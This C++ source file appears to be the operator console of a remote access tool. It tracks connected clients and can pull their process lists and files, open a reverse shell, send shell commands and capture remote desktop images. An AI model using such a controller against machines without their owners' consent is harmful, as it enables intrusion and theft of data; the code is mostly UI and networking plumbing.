#include "Application.h"
#include "services/net/NetServerService.h"
#include "ui/console/mediators/SimpleConsoleUiMediator.h"
#include "../shared/ConcurrentLib/core/Thread.h"
#include "../shared/NetLib/packets/PacketDownload.h"
#include "../shared/IOLib/services/FileSystemService.h"
#include "models/Client.h"
#include "../shared/NetLib/packets/PacketMediaResponse.h"
#include "services/DesktopService.h"
#include <iostream>


DWORD WINAPI serverThreadFunc(LPVOID threadArg)
{
	auto server = static_cast<NetServerService*>(threadArg);
	server->start();
	return 0;
}

Application::Application(const CommandLineArguments& cmd): cli(cmd),
                                                           netServerService(new NetServerService(this)),
                                                           serverThread(nullptr)
{
}

Application::~Application()
{
}


void Application::run()
{
	running = true;
	startUiSubsystem();
	startNetSubsystem();

	uiMediator->loop();
}


void Application::startUiSubsystem()
{
	startUi();
}


void Application::startUi()
{
	if (cli.getUiMode() == Win32Console)
	{
		uiMediator = new SimpleConsoleUiMediator(this);
		uiMediator->showMainUi();
	}
	else if (cli.getUiMode() == Win32Graphical)
	{
		// TODO throw not implemented
	}
	else
	{
		// TODO throw not implemented
	}
}


// Initializes the server and the thread that loops looking for Events comming from the server
void Application::startNetSubsystem()
{
	startServerAsync();
}

void Application::startServerAsync()
{
	serverThread = new Thread(static_cast<LPTHREAD_START_ROUTINE>(serverThreadFunc),
	                          static_cast<PVOID>(netServerService));
	serverThread->run();
}


void Application::onFileDownloaded(Client* client, char* fileBytes, size_t fileSize)
{
	FileSystemService::writeBinaryFile(L"./Downloads/temp.out", fileBytes, fileSize);
}

bool Application::canInteractWith(unsigned long long clientId, bool checkedExistence)
{
	if (checkedExistence)
	{
		return true;
	}
	else
	{
		Client* client = netServerService->getClient(clientId);
		if (client == nullptr)
			return false;
	}

	return true;
}

void Application::onClientConnected(Client* client) const
{
	uiMediator->addClientRow(client);
}

void Application::onProcessListReceived(Client* client, std::vector<Process>* processes) const
{
	uiMediator->showProcessList(client, processes);
}

void Application::onFsRootsReceived(Client* client, const std::vector<FileInfo>& roots) const
{
	uiMediator->appConsole.showFsRoots(client, roots);
	uiMediator->appConsole.printBanner();
}

void Application::onFsFilesReceived(Client* client, const std::wstring& path, const std::vector<FileInfo>& files) const
{
	uiMediator->appConsole.showFsFiles(client, path, files);
	uiMediator->appConsole.printBanner();
}

Client* Application::getClient(unsigned long long clientId) const
{
	return netServerService->getClient(clientId);
}

void Application::requestProcessList(Client* client) const
{
	netServerService->requestProcessList(client);
}

void Application::requestReverseShell(Client* client) const
{
	netServerService->requestReverseShell(client);
}

void Application::sendShellCommand(Client* client, char* instruction) const
{
	std::string ins = std::string(instruction);
	netServerService->sendShellCommand(client, ins);
}

void Application::onShellResult(Client* client, PacketShellAction action, const std::string& data) const
{
	if (action == PacketShellAction::MoreData)
	{
		uiMediator->onShellOutput(client, data);
	}
	else if (action == PacketShellAction::Stop)
	{
		uiMediator->onShellClosed(client);
	}
}

std::vector<Client*> Application::getClients() const
{
	return netServerService->getClients();
}

void Application::listFiles(Client* client, const std::wstring& path)
{
	netServerService->listFiles(client, path);
}

void Application::downloadFile(Client* client, const std::wstring& path)
{
	netServerService->downloadFile(client, path);
}

void Application::startRemoteDesktop(Client* client) const
{
	netServerService->startRemoteDesktop(client);
}

void Application::onServerStatusChanged(const char* str) const
{
	uiMediator->updateStatus(str);
}

void Application::onServerError(const std::string& message)
{
	uiMediator->showErrorMessage(message);
}

void Application::onClientDisconnected(Client* client)
{
	uiMediator->removeClient(client);
}


void Application::onDesktopImageReceived(Client* client, char* imageBytes, size_t imageSize) const
{
	const auto imagePath = new std::wstring(L"D:/temp/desktop_out.jpeg");
	DesktopService::saveBmpFromByteArray(imageBytes, imageSize,
	                                     imagePath->c_str());

	uiMediator->showImage(imageBytes, imageSize);
}
